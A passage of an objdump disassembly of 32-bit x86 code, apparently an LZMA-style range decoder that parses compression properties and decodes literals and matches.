  4081b6:	29 53 0c             	sub    %edx,0xc(%ebx)
  4081b9:	0f b7 10             	movzwl (%eax),%edx
  4081bc:	c1 fa 05             	sar    $0x5,%edx
  4081bf:	66 29 10             	sub    %dx,(%eax)
  4081c2:	81 7b 08 00 00 00 01 	cmpl   $0x1000000,0x8(%ebx)
  4081c9:	73 1a                	jae    0x4081e5
  4081cb:	8b c3                	mov    %ebx,%eax
  4081cd:	e8 b2 fe ff ff       	call   0x408084
  4081d2:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  4081d5:	33 d2                	xor    %edx,%edx
  4081d7:	c1 e1 08             	shl    $0x8,%ecx
  4081da:	8a d0                	mov    %al,%dl
  4081dc:	0b d1                	or     %ecx,%edx
  4081de:	89 53 0c             	mov    %edx,0xc(%ebx)
  4081e1:	c1 63 08 08          	shll   $0x8,0x8(%ebx)
  4081e5:	b8 01 00 00 00       	mov    $0x1,%eax
  4081ea:	5b                   	pop    %ebx
  4081eb:	c3                   	ret
  4081ec:	53                   	push   %ebx
  4081ed:	56                   	push   %esi
  4081ee:	57                   	push   %edi
  4081ef:	55                   	push   %ebp
  4081f0:	51                   	push   %ecx
  4081f1:	8b e9                	mov    %ecx,%ebp
  4081f3:	89 14 24             	mov    %edx,(%esp)
  4081f6:	8b f8                	mov    %eax,%edi
  4081f8:	bb 01 00 00 00       	mov    $0x1,%ebx
  4081fd:	8b 34 24             	mov    (%esp),%esi
  408200:	85 f6                	test   %esi,%esi
  408202:	74 15                	je     0x408219
  408204:	8d 04 5f             	lea    (%edi,%ebx,2),%eax
  408207:	8b d5                	mov    %ebp,%edx
  408209:	e8 56 ff ff ff       	call   0x408164
  40820e:	03 db                	add    %ebx,%ebx
  408210:	4e                   	dec    %esi
  408211:	03 c3                	add    %ebx,%eax
  408213:	85 f6                	test   %esi,%esi
  408215:	8b d8                	mov    %eax,%ebx
  408217:	75 eb                	jne    0x408204
  408219:	8b 0c 24             	mov    (%esp),%ecx
  40821c:	b8 01 00 00 00       	mov    $0x1,%eax
  408221:	d3 e0                	shl    %cl,%eax
  408223:	50                   	push   %eax
  408224:	8b c3                	mov    %ebx,%eax
  408226:	5a                   	pop    %edx
  408227:	2b c2                	sub    %edx,%eax
  408229:	5a                   	pop    %edx
  40822a:	5d                   	pop    %ebp
  40822b:	5f                   	pop    %edi
  40822c:	5e                   	pop    %esi
  40822d:	5b                   	pop    %ebx
  40822e:	c3                   	ret
  40822f:	90                   	nop
  408230:	53                   	push   %ebx
  408231:	56                   	push   %esi
  408232:	57                   	push   %edi
  408233:	55                   	push   %ebp
  408234:	83 c4 f8             	add    $0xfffffff8,%esp
  408237:	33 ff                	xor    %edi,%edi
  408239:	33 f6                	xor    %esi,%esi
  40823b:	8b e8                	mov    %eax,%ebp
  40823d:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  408241:	89 14 24             	mov    %edx,(%esp)
  408244:	3b 34 24             	cmp    (%esp),%esi
  408247:	bb 01 00 00 00       	mov    $0x1,%ebx
  40824c:	7d 1d                	jge    0x40826b
  40824e:	8d 44 5d 00          	lea    0x0(%ebp,%ebx,2),%eax
  408252:	8b 54 24 04          	mov    0x4(%esp),%edx
  408256:	e8 09 ff ff ff       	call   0x408164
  40825b:	03 db                	add    %ebx,%ebx
  40825d:	03 d8                	add    %eax,%ebx
  40825f:	8b ce                	mov    %esi,%ecx
  408261:	d3 e0                	shl    %cl,%eax
  408263:	0b f8                	or     %eax,%edi
  408265:	46                   	inc    %esi
  408266:	3b 34 24             	cmp    (%esp),%esi
  408269:	7c e3                	jl     0x40824e
  40826b:	8b c7                	mov    %edi,%eax
  40826d:	59                   	pop    %ecx
  40826e:	5a                   	pop    %edx
  40826f:	5d                   	pop    %ebp
  408270:	5f                   	pop    %edi
  408271:	5e                   	pop    %esi
  408272:	5b                   	pop    %ebx
  408273:	c3                   	ret
  408274:	53                   	push   %ebx
  408275:	56                   	push   %esi
  408276:	57                   	push   %edi
  408277:	8b fa                	mov    %edx,%edi
  408279:	8b f0                	mov    %eax,%esi
  40827b:	bb 01 00 00 00       	mov    $0x1,%ebx
  408280:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  408283:	8b d7                	mov    %edi,%edx
  408285:	e8 da fe ff ff       	call   0x408164
  40828a:	03 db                	add    %ebx,%ebx
  40828c:	0b c3                	or     %ebx,%eax
  40828e:	8b d8                	mov    %eax,%ebx
  408290:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  408296:	7c e8                	jl     0x408280
  408298:	8b c3                	mov    %ebx,%eax
  40829a:	5f                   	pop    %edi
  40829b:	5e                   	pop    %esi
  40829c:	5b                   	pop    %ebx
  40829d:	c3                   	ret
  40829e:	90                   	nop
  40829f:	90                   	nop
  4082a0:	53                   	push   %ebx
  4082a1:	56                   	push   %esi
  4082a2:	57                   	push   %edi
  4082a3:	55                   	push   %ebp
  4082a4:	51                   	push   %ecx
  4082a5:	88 0c 24             	mov    %cl,(%esp)
  4082a8:	8b fa                	mov    %edx,%edi
  4082aa:	8b f0                	mov    %eax,%esi
  4082ac:	bb 01 00 00 00       	mov    $0x1,%ebx
  4082b1:	0f b6 2c 24          	movzbl (%esp),%ebp
  4082b5:	c1 fd 07             	sar    $0x7,%ebp
  4082b8:	8b d3                	mov    %ebx,%edx
  4082ba:	83 e5 01             	and    $0x1,%ebp
  4082bd:	03 d2                	add    %edx,%edx
  4082bf:	8b c5                	mov    %ebp,%eax
  4082c1:	d0 24 24             	shlb   $1,(%esp)
  4082c4:	c1 e0 08             	shl    $0x8,%eax
  4082c7:	03 c0                	add    %eax,%eax
  4082c9:	03 c6                	add    %esi,%eax
  4082cb:	03 c2                	add    %edx,%eax
  4082cd:	8b d7                	mov    %edi,%edx
  4082cf:	05 00 02 00 00       	add    $0x200,%eax
  4082d4:	e8 8b fe ff ff       	call   0x408164
  4082d9:	03 db                	add    %ebx,%ebx
  4082db:	0b d8                	or     %eax,%ebx
  4082dd:	3b c5                	cmp    %ebp,%eax
  4082df:	74 22                	je     0x408303
  4082e1:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4082e7:	7d 22                	jge    0x40830b
  4082e9:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  4082ec:	8b d7                	mov    %edi,%edx
  4082ee:	e8 71 fe ff ff       	call   0x408164
  4082f3:	03 db                	add    %ebx,%ebx
  4082f5:	0b c3                	or     %ebx,%eax
  4082f7:	8b d8                	mov    %eax,%ebx
  4082f9:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4082ff:	7c e8                	jl     0x4082e9
  408301:	eb 08                	jmp    0x40830b
  408303:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  408309:	7c a6                	jl     0x4082b1
  40830b:	8b c3                	mov    %ebx,%eax
  40830d:	5a                   	pop    %edx
  40830e:	5d                   	pop    %ebp
  40830f:	5f                   	pop    %edi
  408310:	5e                   	pop    %esi
  408311:	5b                   	pop    %ebx
  408312:	c3                   	ret
  408313:	90                   	nop
  408314:	53                   	push   %ebx
  408315:	56                   	push   %esi
  408316:	57                   	push   %edi
  408317:	8b f9                	mov    %ecx,%edi
  408319:	8b f2                	mov    %edx,%esi
  40831b:	8b d8                	mov    %eax,%ebx
  40831d:	8b d6                	mov    %esi,%edx
  40831f:	8b c3                	mov    %ebx,%eax
  408321:	e8 3e fe ff ff       	call   0x408164
  408326:	85 c0                	test   %eax,%eax
  408328:	75 1a                	jne    0x408344
  40832a:	8b c7                	mov    %edi,%eax
  40832c:	8b ce                	mov    %esi,%ecx
  40832e:	c1 e0 03             	shl    $0x3,%eax
  408331:	ba 03 00 00 00       	mov    $0x3,%edx
  408336:	03 c0                	add    %eax,%eax
  408338:	03 c3                	add    %ebx,%eax
  40833a:	83 c0 04             	add    $0x4,%eax
  40833d:	e8 aa fe ff ff       	call   0x4081ec
  408342:	eb 42                	jmp    0x408386
  408344:	8d 43 02             	lea    0x2(%ebx),%eax
  408347:	8b d6                	mov    %esi,%edx
  408349:	e8 16 fe ff ff       	call   0x408164
  40834e:	85 c0                	test   %eax,%eax
  408350:	75 1f                	jne    0x408371
  408352:	8b c7                	mov    %edi,%eax
  408354:	8b ce                	mov    %esi,%ecx
  408356:	c1 e0 03             	shl    $0x3,%eax
  408359:	ba 03 00 00 00       	mov    $0x3,%edx
  40835e:	03 c0                	add    %eax,%eax
  408360:	03 c3                	add    %ebx,%eax
  408362:	05 04 01 00 00       	add    $0x104,%eax
  408367:	e8 80 fe ff ff       	call   0x4081ec
  40836c:	83 c0 08             	add    $0x8,%eax
  40836f:	eb 15                	jmp    0x408386
  408371:	8d 83 04 02 00 00    	lea    0x204(%ebx),%eax
  408377:	8b ce                	mov    %esi,%ecx
  408379:	ba 08 00 00 00       	mov    $0x8,%edx
  40837e:	e8 69 fe ff ff       	call   0x4081ec
  408383:	83 c0 10             	add    $0x10,%eax
  408386:	5f                   	pop    %edi
  408387:	5e                   	pop    %esi
  408388:	5b                   	pop    %ebx
  408389:	c3                   	ret
  40838a:	90                   	nop
  40838b:	90                   	nop
  40838c:	53                   	push   %ebx
  40838d:	56                   	push   %esi
  40838e:	83 f9 05             	cmp    $0x5,%ecx
  408391:	7d 08                	jge    0x40839b
  408393:	b8 01 00 00 00       	mov    $0x1,%eax
  408398:	5e                   	pop    %esi
  408399:	5b                   	pop    %ebx
  40839a:	c3                   	ret
  40839b:	8a 0a                	mov    (%edx),%cl
  40839d:	80 f9 e1             	cmp    $0xe1,%cl
  4083a0:	72 08                	jb     0x4083aa
  4083a2:	b8 01 00 00 00       	mov    $0x1,%eax
  4083a7:	5e                   	pop    %esi
  4083a8:	5b                   	pop    %ebx
  4083a9:	c3                   	ret
  4083aa:	33 db                	xor    %ebx,%ebx
  4083ac:	80 f9 2d             	cmp    $0x2d,%cl
  4083af:	89 58 08             	mov    %ebx,0x8(%eax)
  4083b2:	72 0b                	jb     0x4083bf
  4083b4:	ff 40 08             	incl   0x8(%eax)
  4083b7:	80 c1 d3             	add    $0xd3,%cl
  4083ba:	80 f9 2d             	cmp    $0x2d,%cl
  4083bd:	73 f5                	jae    0x4083b4
  4083bf:	33 db                	xor    %ebx,%ebx
  4083c1:	80 f9 09             	cmp    $0x9,%cl
  4083c4:	89 58 04             	mov    %ebx,0x4(%eax)
  4083c7:	72 0b                	jb     0x4083d4
  4083c9:	ff 40 04             	incl   0x4(%eax)
  4083cc:	80 c1 f7             	add    $0xf7,%cl
  4083cf:	80 f9 09             	cmp    $0x9,%cl
  4083d2:	73 f5                	jae    0x4083c9
  4083d4:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4083da:	89 08                	mov    %ecx,(%eax)
  4083dc:	33 c9                	xor    %ecx,%ecx
  4083de:	33 db                	xor    %ebx,%ebx
  4083e0:	42                   	inc    %edx
  4083e1:	89 48 0c             	mov    %ecx,0xc(%eax)
  4083e4:	0f b6 32             	movzbl (%edx),%esi
  4083e7:	8b cb                	mov    %ebx,%ecx
  4083e9:	43                   	inc    %ebx
  4083ea:	c1 e1 03             	shl    $0x3,%ecx
  4083ed:	42                   	inc    %edx
  4083ee:	d3 e6                	shl    %cl,%esi
  4083f0:	01 70 0c             	add    %esi,0xc(%eax)
  4083f3:	83 fb 04             	cmp    $0x4,%ebx
  4083f6:	7c ec                	jl     0x4083e4
  4083f8:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  4083fc:	75 07                	jne    0x408405
  4083fe:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  408405:	33 c0                	xor    %eax,%eax
  408407:	5e                   	pop    %esi
  408408:	5b                   	pop    %ebx
  408409:	c3                   	ret
  40840a:	90                   	nop
  40840b:	90                   	nop
  40840c:	55                   	push   %ebp
  40840d:	8b ec                	mov    %esp,%ebp
  40840f:	81 c4 7c ff ff ff    	add    $0xffffff7c,%esp
  408415:	53                   	push   %ebx
  408416:	56                   	push   %esi
  408417:	57                   	push   %edi
  408418:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40841b:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40841e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408421:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408424:	33 c9                	xor    %ecx,%ecx
  408426:	8b 50 10             	mov    0x10(%eax),%edx
  408429:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40842c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40842f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408432:	ba 01 00 00 00       	mov    $0x1,%edx
  408437:	8b 48 08             	mov    0x8(%eax),%ecx
  40843a:	d3 e2                	shl    %cl,%edx
  40843c:	4a                   	dec    %edx
  40843d:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408440:	ba 01 00 00 00       	mov    $0x1,%edx
  408445:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408448:	8b 48 04             	mov    0x4(%eax),%ecx
  40844b:	d3 e2                	shl    %cl,%edx
  40844d:	4a                   	dec    %edx
  40844e:	89 55 e0             	mov    %edx,-0x20(%ebp)
  408451:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408454:	8b 10                	mov    (%eax),%edx
  408456:	89 55 dc             	mov    %edx,-0x24(%ebp)
  408459:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40845c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40845f:	8b 70 34             	mov    0x34(%eax),%esi
  408462:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408465:	8b 59 44             	mov    0x44(%ecx),%ebx
  408468:	8b 50 38             	mov    0x38(%eax),%edx
  40846b:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40846e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408471:	8b 41 3c             	mov    0x3c(%ecx),%eax
  408474:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  408477:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40847a:	8b 4a 40             	mov    0x40(%edx),%ecx
  40847d:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  408480:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408483:	8b 50 48             	mov    0x48(%eax),%edx
  408486:	89 55 cc             	mov    %edx,-0x34(%ebp)
  408489:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40848c:	8b 41 2c             	mov    0x2c(%ecx),%eax
  40848f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  408492:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408495:	8b 4a 30             	mov    0x30(%edx),%ecx
  408498:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40849b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40849e:	8b 50 1c             	mov    0x1c(%eax),%edx
  4084a1:	89 55 c0             	mov    %edx,-0x40(%ebp)
  4084a4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4084a7:	8b 41 0c             	mov    0xc(%ecx),%eax
  4084aa:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4084ad:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4084b0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4084b3:	8b 7a 28             	mov    0x28(%edx),%edi
  4084b6:	8b 50 20             	mov    0x20(%eax),%edx
  4084b9:	89 55 84             	mov    %edx,-0x7c(%ebp)
  4084bc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4084bf:	8b 41 24             	mov    0x24(%ecx),%eax
  4084c2:	89 45 88             	mov    %eax,-0x78(%ebp)
  4084c5:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4084c8:	89 55 8c             	mov    %edx,-0x74(%ebp)
  4084cb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4084ce:	8b 41 14             	mov    0x14(%ecx),%eax
  4084d1:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  4084d7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4084da:	8b 4a 18             	mov    0x18(%edx),%ecx
  4084dd:	33 d2                	xor    %edx,%edx
  4084df:	89 4d 80             	mov    %ecx,-0x80(%ebp)
  4084e2:	8b 45 08             	mov    0x8(%ebp),%eax
  4084e5:	89 10                	mov    %edx,(%eax)
  4084e7:	83 7d cc ff          	cmpl   $0xffffffff,-0x34(%ebp)
  4084eb:	75 07                	jne    0x4084f4
  4084ed:	33 c0                	xor    %eax,%eax
  4084ef:	e9 a9 05 00 00       	jmp    0x408a9d
  4084f4:	83 7d bc 00          	cmpl   $0x0,-0x44(%ebp)
  4084f8:	75 16                	jne    0x408510
  4084fa:	8d 55 b8             	lea    -0x48(%ebp),%edx
  4084fd:	89 55 c0             	mov    %edx,-0x40(%ebp)
  408500:	c7 45 bc 01 00 00 00 	movl   $0x1,-0x44(%ebp)
  408507:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40850a:	8a 41 4c             	mov    0x4c(%ecx),%al
  40850d:	88 45 b8             	mov    %al,-0x48(%ebp)
  408510:	83 7d cc fe          	cmpl   $0xfffffffe,-0x34(%ebp)
  408514:	0f 85 9b 00 00 00    	jne    0x4085b5
  40851a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40851d:	b8 00 03 00 00       	mov    $0x300,%eax
  408522:	8b 4a 04             	mov    0x4(%edx),%ecx
  408525:	33 d2                	xor    %edx,%edx
  408527:	03 4d dc             	add    -0x24(%ebp),%ecx
  40852a:	d3 e0                	shl    %cl,%eax
  40852c:	05 36 07 00 00       	add    $0x736,%eax
  408531:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  408534:	89 55 b0             	mov    %edx,-0x50(%ebp)
  408537:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40853a:	8b c1                	mov    %ecx,%eax
  40853c:	89 45 98             	mov    %eax,-0x68(%ebp)
  40853f:	8b 55 b0             	mov    -0x50(%ebp),%edx
  408542:	3b 55 b4             	cmp    -0x4c(%ebp),%edx
  408545:	73 17                	jae    0x40855e
  408547:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  40854a:	66 c7 01 00 04       	movw   $0x400,(%ecx)
  40854f:	ff 45 b0             	incl   -0x50(%ebp)
  408552:	83 45 98 02          	addl   $0x2,-0x68(%ebp)
  408556:	8b 45 b0             	mov    -0x50(%ebp),%eax
  408559:	3b 45 b4             	cmp    -0x4c(%ebp),%eax
  40855c:	72 e9                	jb     0x408547
  40855e:	ba 01 00 00 00       	mov    $0x1,%edx
  408563:	33 c0                	xor    %eax,%eax
  408565:	89 55 d0             	mov    %edx,-0x30(%ebp)
  408568:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40856b:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40856e:	8b f2                	mov    %edx,%esi
  408570:	89 45 c8             	mov    %eax,-0x38(%ebp)
  408573:	33 d2                	xor    %edx,%edx
  408575:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  408578:	33 db                	xor    %ebx,%ebx
  40857a:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40857d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  408580:	33 ff                	xor    %edi,%edi
  408582:	c6 44 10 ff 00       	movb   $0x0,-0x1(%eax,%edx,1)
  408587:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40858d:	e8 32 fb ff ff       	call   0x4080c4
  408592:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  408596:	74 08                	je     0x4085a0
  408598:	8b 45 90             	mov    -0x70(%ebp),%eax
  40859b:	e9 fd 04 00 00       	jmp    0x408a9d
  4085a0:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4085a4:	74 0a                	je     0x4085b0
  4085a6:	b8 01 00 00 00       	mov    $0x1,%eax
  4085ab:	e9 ed 04 00 00       	jmp    0x408a9d
  4085b0:	33 d2                	xor    %edx,%edx
  4085b2:	89 55 cc             	mov    %edx,-0x34(%ebp)
  4085b5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4085b8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4085bb:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  4085be:	89 55 98             	mov    %edx,-0x68(%ebp)
  4085c1:	eb 30                	jmp    0x4085f3
  4085c3:	8b c7                	mov    %edi,%eax
  4085c5:	2b c6                	sub    %esi,%eax
  4085c7:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  4085ca:	72 03                	jb     0x4085cf
  4085cc:	03 45 bc             	add    -0x44(%ebp),%eax
  4085cf:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4085d2:	8a 04 02             	mov    (%edx,%eax,1),%al
  4085d5:	50                   	push   %eax
  4085d6:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4085d9:	58                   	pop    %eax
  4085da:	88 04 39             	mov    %al,(%ecx,%edi,1)
  4085dd:	8b 55 98             	mov    -0x68(%ebp),%edx
  4085e0:	88 02                	mov    %al,(%edx)
  4085e2:	ff 45 ec             	incl   -0x14(%ebp)
  4085e5:	ff 45 98             	incl   -0x68(%ebp)
  4085e8:	47                   	inc    %edi
  4085e9:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  4085ec:	75 02                	jne    0x4085f0
  4085ee:	33 ff                	xor    %edi,%edi
  4085f0:	ff 4d cc             	decl   -0x34(%ebp)
  4085f3:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  4085f7:	74 08                	je     0x408601
  4085f9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4085fc:	3b 45 0c             	cmp    0xc(%ebp),%eax
  4085ff:	72 c2                	jb     0x4085c3
  408601:	85 ff                	test   %edi,%edi
  408603:	75 0f                	jne    0x408614
  408605:	8b 55 c0             	mov    -0x40(%ebp),%edx
  408608:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  40860b:	8a 44 0a ff          	mov    -0x1(%edx,%ecx,1),%al
  40860f:	88 45 eb             	mov    %al,-0x15(%ebp)
  408612:	eb 0a                	jmp    0x40861e
  408614:	8b 55 c0             	mov    -0x40(%ebp),%edx
  408617:	8a 4c 3a ff          	mov    -0x1(%edx,%edi,1),%cl
  40861b:	88 4d eb             	mov    %cl,-0x15(%ebp)
  40861e:	33 c0                	xor    %eax,%eax
  408620:	33 d2                	xor    %edx,%edx
  408622:	89 45 90             	mov    %eax,-0x70(%ebp)
  408625:	89 55 94             	mov    %edx,-0x6c(%ebp)
  408628:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40862b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40862e:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  408631:	89 55 98             	mov    %edx,-0x68(%ebp)
  408634:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408637:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  40863a:	0f 83 d8 03 00 00    	jae    0x408a18
  408640:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408643:	03 45 c8             	add    -0x38(%ebp),%eax
  408646:	23 45 e4             	and    -0x1c(%ebp),%eax
  408649:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40864c:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  408650:	74 08                	je     0x40865a
  408652:	8b 45 90             	mov    -0x70(%ebp),%eax
  408655:	e9 43 04 00 00       	jmp    0x408a9d
  40865a:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40865e:	74 0a                	je     0x40866a
  408660:	b8 01 00 00 00       	mov    $0x1,%eax
  408665:	e9 33 04 00 00       	jmp    0x408a9d
  40866a:	8b c3                	mov    %ebx,%eax
  40866c:	8b 55 ac             	mov    -0x54(%ebp),%edx
  40866f:	c1 e0 04             	shl    $0x4,%eax
  408672:	03 d2                	add    %edx,%edx
  408674:	03 c0                	add    %eax,%eax
  408676:	03 45 f0             	add    -0x10(%ebp),%eax
  408679:	03 c2                	add    %edx,%eax
  40867b:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408681:	e8 de fa ff ff       	call   0x408164
  408686:	85 c0                	test   %eax,%eax
  408688:	0f 85 c1 00 00 00    	jne    0x40874f
  40868e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408691:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408694:	03 45 c8             	add    -0x38(%ebp),%eax
  408697:	33 d2                	xor    %edx,%edx
  408699:	23 45 e0             	and    -0x20(%ebp),%eax
  40869c:	d3 e0                	shl    %cl,%eax
  40869e:	b9 08 00 00 00       	mov    $0x8,%ecx
  4086a3:	8a 55 eb             	mov    -0x15(%ebp),%dl
  4086a6:	2b 4d dc             	sub    -0x24(%ebp),%ecx
  4086a9:	d3 fa                	sar    %cl,%edx
  4086ab:	03 c2                	add    %edx,%eax
  4086ad:	c1 e0 08             	shl    $0x8,%eax
  4086b0:	8d 04 40             	lea    (%eax,%eax,2),%eax
  4086b3:	03 c0                	add    %eax,%eax
  4086b5:	03 45 f0             	add    -0x10(%ebp),%eax
  4086b8:	05 6c 0e 00 00       	add    $0xe6c,%eax
  4086bd:	83 fb 07             	cmp    $0x7,%ebx
  4086c0:	7c 34                	jl     0x4086f6
  4086c2:	8b d7                	mov    %edi,%edx
  4086c4:	2b d6                	sub    %esi,%edx
  4086c6:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  4086c9:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  4086cc:	3b 4d bc             	cmp    -0x44(%ebp),%ecx
  4086cf:	72 06                	jb     0x4086d7
  4086d1:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4086d4:	01 55 a4             	add    %edx,-0x5c(%ebp)
  4086d7:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4086da:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4086dd:	8a 0c 11             	mov    (%ecx,%edx,1),%cl
  4086e0:	88 4d ab             	mov    %cl,-0x55(%ebp)
  4086e3:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4086e9:	8a 4d ab             	mov    -0x55(%ebp),%cl
  4086ec:	e8 af fb ff ff       	call   0x4082a0
  4086f1:	88 45 eb             	mov    %al,-0x15(%ebp)
  4086f4:	eb 0e                	jmp    0x408704
  4086f6:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4086fc:	e8 73 fb ff ff       	call   0x408274
  408701:	88 45 eb             	mov    %al,-0x15(%ebp)
  408704:	8b 45 98             	mov    -0x68(%ebp),%eax
  408707:	8a 4d eb             	mov    -0x15(%ebp),%cl
  40870a:	88 08                	mov    %cl,(%eax)
  40870c:	ff 45 ec             	incl   -0x14(%ebp)
  40870f:	ff 45 98             	incl   -0x68(%ebp)
  408712:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  408715:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  408718:	73 03                	jae    0x40871d
  40871a:	ff 45 c4             	incl   -0x3c(%ebp)
  40871d:	8b 55 c0             	mov    -0x40(%ebp),%edx
  408720:	8a 4d eb             	mov    -0x15(%ebp),%cl
  408723:	88 0c 3a             	mov    %cl,(%edx,%edi,1)
  408726:	47                   	inc    %edi
  408727:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  40872a:	75 02                	jne    0x40872e
  40872c:	33 ff                	xor    %edi,%edi
  40872e:	83 fb 04             	cmp    $0x4,%ebx
  408731:	7d 07                	jge    0x40873a
  408733:	33 db                	xor    %ebx,%ebx
  408735:	e9 d2 02 00 00       	jmp    0x408a0c
  40873a:	83 fb 0a             	cmp    $0xa,%ebx
  40873d:	7d 08                	jge    0x408747
  40873f:	83 eb 03             	sub    $0x3,%ebx
  408742:	e9 c5 02 00 00       	jmp    0x408a0c
  408747:	83 eb 06             	sub    $0x6,%ebx
  40874a:	e9 bd 02 00 00       	jmp    0x408a0c
  40874f:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408755:	8b c3                	mov    %ebx,%eax
  408757:	03 c0                	add    %eax,%eax
  408759:	03 45 f0             	add    -0x10(%ebp),%eax
  40875c:	05 80 01 00 00       	add    $0x180,%eax
  408761:	e8 fe f9 ff ff       	call   0x408164
  408766:	48                   	dec    %eax
  408767:	0f 85 37 01 00 00    	jne    0x4088a4
  40876d:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408773:	8b c3                	mov    %ebx,%eax
  408775:	03 c0                	add    %eax,%eax
  408777:	03 45 f0             	add    -0x10(%ebp),%eax
  40877a:	05 98 01 00 00       	add    $0x198,%eax
  40877f:	e8 e0 f9 ff ff       	call   0x408164
  408784:	85 c0                	test   %eax,%eax
  408786:	0f 85 93 00 00 00    	jne    0x40881f
  40878c:	8b c3                	mov    %ebx,%eax
  40878e:	8b 55 ac             	mov    -0x54(%ebp),%edx
  408791:	c1 e0 04             	shl    $0x4,%eax
  408794:	03 d2                	add    %edx,%edx
  408796:	03 c0                	add    %eax,%eax
  408798:	03 45 f0             	add    -0x10(%ebp),%eax
  40879b:	03 c2                	add    %edx,%eax
  40879d:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4087a3:	05 e0 01 00 00       	add    $0x1e0,%eax
  4087a8:	e8 b7 f9 ff ff       	call   0x408164
  4087ad:	85 c0                	test   %eax,%eax
  4087af:	0f 85 be 00 00 00    	jne    0x408873
  4087b5:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  4087b9:	75 0a                	jne    0x4087c5
  4087bb:	b8 01 00 00 00       	mov    $0x1,%eax
  4087c0:	e9 d8 02 00 00       	jmp    0x408a9d
  4087c5:	83 fb 07             	cmp    $0x7,%ebx
  4087c8:	7d 07                	jge    0x4087d1
  4087ca:	b9 09 00 00 00       	mov    $0x9,%ecx
  4087cf:	eb 05                	jmp    0x4087d6
  4087d1:	b9 0b 00 00 00       	mov    $0xb,%ecx
